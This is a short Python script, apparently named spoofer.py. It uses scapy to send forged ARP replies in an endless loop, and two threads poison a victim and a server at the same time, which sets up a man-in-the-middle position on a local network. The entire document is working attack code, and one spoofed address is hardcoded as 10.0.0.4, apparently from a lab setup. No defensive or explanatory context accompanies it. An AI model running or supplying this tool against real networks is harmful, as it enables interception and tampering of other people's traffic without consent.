from scapy.all import ARP, Ether, srp
from time import sleep
import sys
import threading

def arp_spoof(dst_ip, spoofed_ip, dst_mac, src_mac, operation, interface):
    arp_response = ARP(op=operation, pdst=dst_ip, psrc=spoofed_ip, hwdst=dst_mac, hwsrc=src_mac)
    ether_frame = Ether(src=src_mac, dst=dst_mac)
    arp_packet = ether_frame / arp_response
    
    while True:
        print(f"Spoofing is ongoing for {spoofed_ip} ...")
        srp(arp_packet, timeout=2, retry=1, verbose=False, iface=interface)
        sleep(5)

if __name__ == "__main__":

    if len(sys.argv) < 8:
        print(f"\nProvide the required arguments.")
        print(f"Usage: python3 spoofer.py server_ip victim_ip server_mac src_mac operation interface victim_mac")
        print(f"Aborting ...\n")
        exit(1)

    dst_ip = sys.argv[1]
    spoofed_ip = sys.argv[2]
    dst_mac = sys.argv[3]
    src_mac = sys.argv[4]
    operation = int(sys.argv[5])
    interface = sys.argv[6]

    thread1 = threading.Thread(target=arp_spoof, args=(dst_ip, spoofed_ip, dst_mac, src_mac, operation, interface))

    dst_ip = spoofed_ip
    spoofed_ip = "10.0.0.4"
    dst_mac = sys.argv[7]

    thread2 = threading.Thread(target=arp_spoof, args=(dst_ip, spoofed_ip, dst_mac, src_mac, operation, interface))

    # Start the threads
    thread1.start()
    thread2.start()

    # Wait for both threads to complete
    thread1.join()
    thread2.join()
